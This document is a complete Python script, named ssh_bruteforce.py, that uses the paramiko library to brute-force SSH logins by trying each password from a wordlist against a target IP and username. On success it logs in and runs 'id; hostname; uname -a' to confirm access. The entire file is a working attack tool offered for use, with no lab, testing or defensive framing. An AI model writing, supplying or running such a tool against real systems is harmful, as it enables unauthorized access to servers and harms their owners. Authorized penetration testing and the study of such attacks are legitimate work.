import paramiko
import sys
import os
import socket
import time

def ssh_bruteforce(hostname, username, password_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            try:
                print(f"[*] Attempting login with: {username}:{password}")
                client.connect(hostname, username=username, password=password)
                print(f"[+] SUCCESS! Username: {username}, Password: {password}")
                return (username, password)
            except paramiko.AuthenticationException:
                print(f"[-] Authentication failed: {username}:{password}")
                continue
            except socket.error:
                print(f"[-] Connection failed: Could not connect to {hostname}")
                return None
            finally:
                client.close()
    
    return None

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 ssh_bruteforce.py <target_ip> <username> <password_file>")
        sys.exit(1)
    
    target = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]
    
    print(f"[*] Starting SSH brute force against {target}")
    credentials = ssh_bruteforce(target, username, password_file)
    
    if credentials:
        print(f"[+] SSH credentials found: {credentials[0]}:{credentials[1]}")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, username=credentials[0], password=credentials[1])
            print("[+] Successfully connected!")
            stdin, stdout, stderr = client.exec_command("id; hostname; uname -a")
            output = stdout.read().decode()
            print(f"[+] Command output:\n{output}")
            
            client.close()
        except Exception as e:
            print(f"[-] Failed to demonstrate successful connection: {e}")
    else:
        print("[-] Failed to find valid credentials")

if __name__ == "__main__":
    main()
